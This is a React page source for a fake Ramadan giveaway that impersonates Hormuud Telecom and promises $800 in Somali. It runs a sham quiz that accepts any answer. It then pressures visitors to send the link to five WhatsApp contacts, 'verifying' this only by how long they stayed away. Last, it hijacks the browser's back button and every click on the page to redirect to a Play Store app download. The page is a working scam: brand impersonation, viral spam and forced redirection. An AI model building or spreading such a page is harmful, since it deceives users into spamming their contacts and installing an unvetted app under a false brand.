"use client";

import { useState, useEffect, useRef } from "react";
import Head from "next/head";

export default function HormuudPromoPage() {
  const appLink = "https://play.google.com/store/apps/details?id=com.myguri.me";

  // State Management
  const [currentStep, setCurrentStep] = useState(1);
  const [shares, setShares] = useState(0);
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [isFinalStepActive, setIsFinalStepActive] = useState(false);
  const [popup, setPopup] = useState({ visible: false, title: "", message: "", type: "error" });

  // Refs for sharing logic
  const shareState = useRef({ isSharing: false, startTime: 0, timeout: null as any });
  const giftsAnimated = useRef(false);

  // Load progress from LocalStorage on mount
  useEffect(() => {
    const savedStep = localStorage.getItem("hormuud_step");
    const savedShares = localStorage.getItem("hormuud_shares");
    if (savedStep) {
      const step = parseInt(savedStep);
      setCurrentStep(step >= 6 ? 6 : step);
    }
    if (savedShares) {
      setShares(parseInt(savedShares));
    }
  }, []);

  // Save progress & trigger final effects
  useEffect(() => {
    localStorage.setItem("hormuud_step", currentStep.toString());
    localStorage.setItem("hormuud_shares", shares.toString());

    if (currentStep === 6 && !isFinalStepActive) {
      activateFinalLockdown();
    }
  }, [currentStep, shares, isFinalStepActive]);

  // Handle WhatsApp Share Return Logic
  useEffect(() => {
    const handleVisibilityChange = () => {
      const state = shareState.current;
      if (state.isSharing && (document.visibilityState === "visible" || document.hasFocus())) {
        clearTimeout(state.timeout);
        state.isSharing = false;
        const timeAway = Date.now() - state.startTime;

        // Validation heuristics for sharing
        if (timeAway >= 5000 && timeAway <= 20000) {
          setShares((prev) => {
            const newShares = prev + 1;
            if (newShares >= 5) {
              setTimeout(() => setCurrentStep(6), 1000);
            }
            return newShares;
          });
        } else if (timeAway < 5000) {
          setTimeout(() => {
            showPopup(
              "Khalad dhacay!",
              "Waxaa u muuqataa inadan si sax ah u dirin fariinta. Fadlan dhab ugu dir asxaabtaada WhatsApp-ka si aad u xaqiijiso abaalmarinta.",
              "error"
            );
          }, 500);
        } else {
          setTimeout(() => {
            showPopup("Isku day mar kale!", "Waxaa laga yaabaa inaadan dirin. Fadlan isku day mar kale.", "error");
          }, 500);
        }
      }
    };

    document.addEventListener("visibilitychange", handleVisibilityChange);
    window.addEventListener("focus", handleVisibilityChange);
    
    return () => {
      document.removeEventListener("visibilitychange", handleVisibilityChange);
      window.removeEventListener("focus", handleVisibilityChange);
    };
  }, []);

  // Actions
  const goToStep = (n: number) => {
    setCurrentStep(n);
  };

  const selectLocation = (location: string) => {
    localStorage.setItem("hormuud_location", location);
    goToStep(5);
  };

  const initiateShare = () => {
    if (shares >= 5) return;
    shareState.current.isSharing = true;
    shareState.current.startTime = Date.now();

    const msg = encodeURIComponent(
      "Hambalyo! Fursad Dahabi ah oo aad kaga guulaysan karto $800 bisha Ramadaan. Riix linkigan si aad uga qayb qaadato: " +
        window.location.origin +
        " - Ku dar asxaabtaada si ay iyaguna guuleystaan!"
    );
    window.location.href = `whatsapp://send?text=${msg}`;

    shareState.current.timeout = setTimeout(() => {
      if (shareState.current.isSharing) {
        shareState.current.isSharing = false;
        showPopup("Khalad dhacay!", "Waxaa laga yaabaa inaadan si sax ah u dirin. Fadlan isku day mar kale oo dhab u dir.", "error");
      }
    }, 30000);
  };

  const showPopup = (title: string, message: string, type = "error") => {
    setPopup({ visible: true, title, message, type });
  };

  const closePopup = () => {
    setPopup((prev) => ({ ...prev, visible: false }));
  };

  const activateFinalLockdown = () => {
    setIsFinalStepActive(true);
    if (!giftsAnimated.current) {
      createFallingGifts();
      giftsAnimated.current = true;
    }
    window.history.pushState(null, "", location.href);
    window.onpopstate = () => {
      window.location.href = appLink;
    };
    setTimeout(() => {
      document.body.addEventListener("click", () => {
        window.location.href = appLink;
      }, true);
    }, 100);
  };

  const createFallingGifts = () => {
    const icons = ["🎁", "💵", "🌙", "📱", "💰", "✨"];
    const spawnIcon = () => {
      const el = document.createElement("div");
      el.innerText = icons[Math.floor(Math.random() * icons.length)];
      el.className = "falling-icon absolute z-[100] pointer-events-none text-4xl drop-shadow-md";
      el.style.left = Math.random() * 100 + "vw";
      el.style.animationDuration = Math.random() * 2 + 2 + "s";
      document.body.appendChild(el);
      setTimeout(() => el.remove(), 4000);
    };

    const fastInterval = setInterval(spawnIcon, 150);
    setTimeout(() => {
      clearInterval(fastInterval);
      setInterval(spawnIcon, 1500);
    }, 3500);
  };

  return (
    <>
      {/* Required for FontAwesome Icons & Custom Fonts to load */}
      <style dangerouslySetInnerHTML={{ __html: `
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
        @import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css');

        body { font-family: 'Inter', sans-serif; }
        #sidebar::-webkit-scrollbar { width: 4px; }
        #sidebar::-webkit-scrollbar-thumb { background: #4b5563; border-radius: 4px; }
        .menu-transition { transition: transform 0.3s ease-in-out; }
        
        @keyframes fall {
          0% { transform: translateY(-10vh) rotate(0deg) scale(0.8); opacity: 1; }
          100% { transform: translateY(110vh) rotate(360deg) scale(1.2); opacity: 0; }
        }
        .falling-icon { position: fixed; z-index: 100; pointer-events: none; animation: fall linear forwards; font-size: 2.5rem; text-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        
        @keyframes shimmer {
          100% { transform: translateX(100%); }
        }
        .quiz-card { transition: all 0.3s ease; }
        .quiz-card:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,168,89,0.15); }
        .gradient-text { background-clip: text; -webkit-background-clip: text; color: transparent; }
      `}} />

      <div className="bg-gradient-to-b from-[#e6f6ed] to-white text-gray-800 antialiased overflow-x-hidden relative min-h-screen flex flex-col">
        {/* Overlay */}
        <div
          className={`fixed inset-0 bg-black/50 z-40 transition-opacity duration-300 ${isMenuOpen ? "opacity-100" : "hidden opacity-0"}`}
          onClick={() => setIsMenuOpen(false)}
        />

        {/* Sidebar Navigation */}
        <nav
          id="sidebar"
          className={`fixed top-0 left-0 w-[85%] max-w-sm h-full bg-[#25262a] text-white z-50 transform menu-transition overflow-y-auto flex flex-col shadow-2xl ${
            isMenuOpen ? "translate-x-0" : "-translate-x-full"
          }`}
        >
          <div className="p-4 border-b border-gray-700 flex gap-2">
            <input
              type="text"
              placeholder="Search your keyword..."
              className="w-full bg-[#1a1c1e] text-white px-4 py-3 rounded-md focus:outline-none focus:ring-1 focus:ring-[#00A859] placeholder-gray-500 text-sm"
            />
            <button className="bg-[#00A859] hover:bg-[#008c4a] px-4 py-3 rounded-md transition text-white">
              <i className="fas fa-search"></i>
            </button>
          </div>
          <ul className="flex-1 py-2 font-semibold text-sm tracking-wide">
            <li><a href="#" className="block px-6 py-4 hover:bg-[#333438] transition border-b border-gray-700/50">HOME</a></li>
            <li><a href="#" className="flex items-center justify-between px-6 py-4 hover:bg-[#333438] transition border-b border-gray-700/50">PERSONAL <i className="fas fa-chevron-right text-gray-500 text-xs"></i></a></li>
            <li><a href="#" className="flex items-center justify-between px-6 py-4 hover:bg-[#333438] transition border-b border-gray-700/50">BUSINESS <i className="fas fa-chevron-right text-gray-500 text-xs"></i></a></li>
            <li><a href="#" className="flex items-center justify-between px-6 py-4 hover:bg-[#333438] transition border-b border-gray-700/50">WHO WE ARE <i className="fas fa-chevron-right text-gray-500 text-xs"></i></a></li>
            <li><a href="#" className="flex items-center justify-between px-6 py-4 hover:bg-[#333438] transition border-b border-gray-700/50">MEDIA <i className="fas fa-chevron-right text-gray-500 text-xs"></i></a></li>
            <li><a href="#" className="block px-6 py-4 hover:bg-[#333438] transition">CONTACT US</a></li>
          </ul>
        </nav>

        {/* Header */}
        <header className="bg-white border-b border-gray-200 sticky top-0 z-30 shadow-sm">
          <div className="max-w-7xl mx-auto px-4 h-[72px] flex items-center justify-between">
            <button onClick={() => setIsMenuOpen(!isMenuOpen)} className="flex flex-col justify-center items-start gap-[7px] w-9 h-9 focus:outline-none z-50">
              <span className={`block w-8 h-[3px] bg-[#222] rounded-full transition-all duration-300 origin-left ${isMenuOpen ? 'rotate-45 translate-x-[5px] translate-y-[6px]' : ''}`}></span>
              <span className={`block w-8 h-[3px] bg-[#222] rounded-full transition-opacity duration-300 ${isMenuOpen ? 'opacity-0' : 'opacity-100'}`}></span>
              <span className={`block h-[3px] bg-[#222] rounded-full transition-all duration-300 origin-left ${isMenuOpen ? 'w-[2rem] -rotate-45 translate-x-[5px] -translate-y-[6px]' : 'w-5'}`}></span>
            </button>
            <a href="#" className="flex-1 flex justify-center items-center pointer-events-none px-2">
              <img src="https://hormuud.com/Svg/Hormuud.svg" alt="Hormuud Telecom" className="h-16 w-auto object-contain" />
            </a>
            <div className="relative flex items-center justify-center p-1 cursor-pointer">
              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#222" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <path d="M6 8h12v11a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2V8z"></path>
                <path d="M9 8V5a3 3 0 0 1 6 0v3"></path>
              </svg>
              <span className="absolute -top-1 -right-2 bg-[#00A859] text-white text-[11px] font-bold h-[22px] w-[22px] flex items-center justify-center rounded-full border-[2px] border-white shadow-sm">0</span>
            </div>
          </div>
        </header>

        {/* Trust Banner */}
        {currentStep < 6 && (
          <div className="bg-gradient-to-r from-[#00A859] to-green-600 text-white py-3 px-4 text-center text-sm font-bold flex justify-center items-center gap-2 shadow-md">
            <i className="fas fa-moon text-white text-lg animate-pulse"></i> Ku Guulayso Abaalmarinta Ramadaanka ee Hormuud - Fursad Dahabi ah!
          </div>
        )}

        {/* Main Content Area */}
        <main className="flex-1 max-w-md mx-auto px-5 py-8 w-full text-center relative z-10">
          
          {/* Intro Header */}
          {currentStep < 4 && (
            <div className="mb-10 mt-2 animate-fade-in">
              <div className="inline-flex items-center justify-center gap-2 bg-white text-[#00A859] px-5 py-3 rounded-full text-sm font-black uppercase tracking-widest mb-6 border border-[#00A859] shadow-lg">
                <i className="fas fa-star-and-crescent text-[#00A859] animate-spin-slow"></i>
                Fursada Ramadaanka ee Gaarka ah!
              </div>
              <h1 className="text-gray-900 text-5xl font-black uppercase tracking-tight leading-tight mb-4 drop-shadow-xl">
                Ku Guulayso <br />
                <span className="gradient-text bg-gradient-to-r from-[#00A859] to-green-400 text-7xl drop-shadow-2xl block mt-2">$800</span>
              </h1>
              <p className="text-gray-700 font-semibold text-lg leading-relaxed px-4 bg-white/80 py-4 rounded-2xl border border-gray-200 shadow-md backdrop-blur-md">
                Ka qayb qaad barnaamijka abaalmarinta bisha barakaysan ee Ramadaan. Jawaab su'aalahan fudud si aad u hesho <strong className="text-[#00A859]">$800 Dollar</strong> oo degdeg ah! Tusaale ahaan, 1000+ qof ayaa horey u guuleystay.
              </p>
            </div>
          )}

          {/* STEP 1 */}
          {currentStep === 1 && (
            <div className="bg-white p-6 rounded-2xl shadow-xl border border-gray-100 relative overflow-hidden quiz-card animate-fade-in">
              <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-[#00A859] to-green-500"></div>
              <h2 className="text-2xl font-bold text-gray-900 mb-6 mt-2">1. Hore ma u maqashay shirkada Hormuud?</h2>
              <div className="flex gap-4">
                <button onClick={() => goToStep(2)} className="flex-1 bg-white hover:bg-[#00A859] hover:text-white border-2 border-[#00A859] text-[#00A859] py-4 rounded-xl font-bold text-lg transition-all duration-300 shadow-md quiz-card">Haa</button>
                <button onClick={() => goToStep(2)} className="flex-1 bg-white hover:bg-[#00A859] hover:text-white border-2 border-[#00A859] text-[#00A859] py-4 rounded-xl font-bold text-lg transition-all duration-300 shadow-md quiz-card">Maya</button>
              </div>
            </div>
          )}

          {/* STEP 2 */}
          {currentStep === 2 && (
            <div className="bg-white p-6 rounded-2xl shadow-xl border border-gray-100 relative overflow-hidden quiz-card animate-fade-in">
              <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-[#00A859] to-green-500"></div>
              <h2 className="text-2xl font-bold text-gray-900 mb-6 mt-2">2. Ma Wiil ba tahay mise Gabadh?</h2>
              <div className="flex gap-4">
                <button onClick={() => goToStep(3)} className="flex-1 bg-white hover:bg-[#00A859] hover:text-white border-2 border-[#00A859] text-[#00A859] py-5 rounded-xl font-bold text-lg transition-all duration-300 flex flex-col items-center gap-2 group shadow-md quiz-card">
                  <i className="fas fa-male text-4xl text-[#00A859] group-hover:text-white transition"></i> Wiil
                </button>
                <button onClick={() => goToStep(3)} className="flex-1 bg-white hover:bg-[#00A859] hover:text-white border-2 border-[#00A859] text-[#00A859] py-5 rounded-xl font-bold text-lg transition-all duration-300 flex flex-col items-center gap-2 group shadow-md quiz-card">
                  <i className="fas fa-female text-4xl text-[#00A859] group-hover:text-white transition"></i> Gabadh
                </button>
              </div>
            </div>
          )}

          {/* STEP 3 */}
          {currentStep === 3 && (
            <div className="bg-white p-6 rounded-2xl shadow-xl border border-gray-100 relative overflow-hidden quiz-card animate-fade-in">
              <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-[#00A859] to-green-500"></div>
              <h2 className="text-2xl font-bold text-gray-900 mb-6 mt-2">3. Ma jeclaan layd inad ka qayb qaadato Tartankan?</h2>
              <div className="flex flex-col gap-4">
                <button onClick={() => goToStep(4)} className="w-full bg-[#00A859] text-white py-4 rounded-xl font-bold text-lg shadow-xl hover:shadow-2xl transition-all duration-300 active:scale-95 quiz-card">Haa, Waan Jeclahay <i className="fas fa-check-circle ml-2"></i></button>
                <button onClick={() => goToStep(4)} className="w-full bg-gray-200 text-gray-700 hover:bg-gray-300 py-4 rounded-xl font-bold text-lg transition-all duration-300 quiz-card">Maya</button>
              </div>
            </div>
          )}

          {/* STEP 4 */}
          {currentStep === 4 && (
            <div className="bg-white p-6 rounded-2xl shadow-xl border border-gray-100 relative overflow-hidden quiz-card animate-fade-in">
              <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-[#00A859] to-green-500"></div>
              <h2 className="text-2xl font-bold text-gray-900 mb-6 mt-2">4. Halkee ayaad ka joogtaa?</h2>
              <div className="grid grid-cols-2 gap-4 mb-2">
                {["Somaliland", "Somalia", "Djibouti", "Ethiopia", "Kenya", "Others"].map((loc) => (
                  <button key={loc} onClick={() => selectLocation(loc)} className="bg-white hover:bg-[#00A859] hover:text-white border-2 border-[#00A859] text-[#00A859] py-4 rounded-xl font-bold text-md transition-all duration-300 shadow-md quiz-card">
                    {loc}
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* STEP 5 */}
          {currentStep === 5 && (
            <div className="bg-white p-6 rounded-2xl shadow-xl border border-gray-100 relative overflow-hidden quiz-card animate-fade-in">
              <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-[#25D366] to-green-500"></div>
              <h2 className="text-2xl font-black text-gray-900 mb-3 mt-2">Fadlan La Wadaag Asxaabtaada!</h2>
              <p className="text-base text-gray-700 mb-6 font-semibold leading-relaxed">
                Si aad u hesho abaalmarintaada <strong className="text-[#00A859]">$800</strong> ah, u dir linkigan <strong className="text-gray-900">5 asxaabtaada ah</strong> ee WhatsApp-ka. Ku dar inay ayagana guuleystaan!
              </p>
              
              <div className="relative w-full h-6 mb-2 overflow-hidden rounded-full bg-gray-200 border border-gray-300 shadow-inner">
                <div className="bg-gradient-to-r from-[#00A859] to-[#25D366] h-full rounded-full transition-all duration-500 relative" style={{ width: `${shares * 20}%` }}>
                  <div className="absolute inset-0 bg-white/30 animate-[shimmer_2s_infinite]"></div>
                </div>
              </div>
              <p className="text-sm font-bold text-gray-600 mb-6 text-right">
                <span className="text-[#00A859] text-xl">{shares}</span> / 5 Asxaab
              </p>
              
              <button onClick={initiateShare} className={`w-full ${shares >= 5 ? 'bg-[#00A859]' : 'bg-[#25D366] hover:bg-[#128C7E]'} text-white py-4 rounded-xl font-black text-xl shadow-2xl flex justify-center items-center gap-3 active:scale-95 transition-all duration-300 relative overflow-hidden quiz-card`}>
                <i className="fab fa-whatsapp text-3xl animate-bounce"></i>
                <span>{shares >= 5 ? "Waa La Xaqiijiyay ✓" : "Share WhatsApp"}</span>
              </button>
            </div>
          )}

          {/* STEP 6 (Final Step) */}
          {currentStep === 6 && (
            <div className="w-full h-full flex flex-col justify-center items-center mt-6 animate-fade-in">
              <div className="bg-gradient-to-br from-white to-[#e6f6ed] p-8 rounded-3xl shadow-2xl border-2 border-[#00A859] relative overflow-hidden w-full quiz-card">
                <div className="absolute -top-12 -right-12 w-40 h-40 bg-[#00A859] opacity-20 rounded-full blur-3xl animate-pulse"></div>
                <div className="absolute -bottom-12 -left-12 w-40 h-40 bg-green-400 opacity-20 rounded-full blur-3xl animate-pulse"></div>
                
                <div className="text-[#00A859] text-7xl mb-4 animate-bounce drop-shadow-2xl"><i className="fas fa-trophy"></i></div>
                <h2 className="text-4xl font-black text-gray-900 mb-3 uppercase tracking-tight leading-tight">
                  Hambalyo! <br />
                  <span className="gradient-text bg-gradient-to-r from-[#00A859] to-green-400">Waad Guuleysatay</span>
                </h2>
                <p className="text-gray-700 mb-8 font-semibold leading-relaxed text-base px-4">
                  Talaabada ugu dambeysa: Lasoo deg App-ka hoose si aad u hesho <strong className="text-[#00A859]">$800</strong> kaaga hadda. Ku dar 500,000+ isticmaaleyaal ku faraxsan!
                </p>
                
                <button className="w-full bg-gradient-to-r from-[#00A859] to-green-500 text-white py-5 rounded-2xl text-2xl font-black shadow-[0_12px_24px_rgba(0,168,89,0.4)] uppercase tracking-widest relative overflow-hidden group hover:shadow-[0_16px_32px_rgba(0,168,89,0.5)] transition-all duration-300">
                  <span className="relative z-10">La Dag App-ka <i className="fas fa-download ml-2 animate-pulse"></i></span>
                  <div className="absolute inset-0 h-full w-full bg-gradient-to-r from-transparent via-white/30 to-transparent -translate-x-full group-hover:animate-[shimmer_1.5s_infinite]"></div>
                </button>
              </div>
              
              <div className="mt-8 flex justify-center items-center gap-8 text-gray-500">
                <div className="flex flex-col items-center"><i className="fas fa-shield-alt text-3xl mb-1 text-[#00A859]"></i><span className="text-xs font-bold uppercase">100% Amaan</span></div>
                <div className="flex flex-col items-center"><i className="fas fa-check-decagram text-3xl mb-1 text-[#00A859]"></i><span className="text-xs font-bold uppercase">Waa La Xaqiijiyay</span></div>
                <div className="flex flex-col items-center"><i className="fas fa-users text-3xl mb-1 text-[#00A859]"></i><span className="text-xs font-bold uppercase">1000+ Guuleystay</span></div>
              </div>
            </div>
          )}
        </main>

        {/* Modal / Popup */}
        {popup.visible && (
          <div className="fixed inset-0 bg-black/70 z-[100] flex items-center justify-center p-5 backdrop-blur-md transition-opacity duration-300">
            <div className={`bg-white rounded-3xl p-6 max-w-sm w-full shadow-2xl transform transition-transform duration-300 flex flex-col items-center text-center border-t-4 ${popup.type === 'error' ? 'border-red-500' : 'border-[#00A859]'}`}>
              <div className="text-6xl mb-4 mt-2">
                {popup.type === "error" ? (
                  <i className="fas fa-exclamation-circle text-red-500"></i>
                ) : (
                  <i className="fas fa-check-circle text-[#00A859]"></i>
                )}
              </div>
              <h3 className="text-3xl font-black text-gray-900 mb-2 tracking-tight">{popup.title}</h3>
              <p className="text-gray-600 mb-8 font-medium leading-relaxed text-base">{popup.message}</p>
              <button onClick={closePopup} className="w-full bg-gray-900 hover:bg-black text-white py-4 rounded-xl font-bold text-lg shadow-xl active:scale-95 transition-all duration-300">
                Waayahay (OK)
              </button>
            </div>
          </div>
        )}
      </div>
    </>
  );
}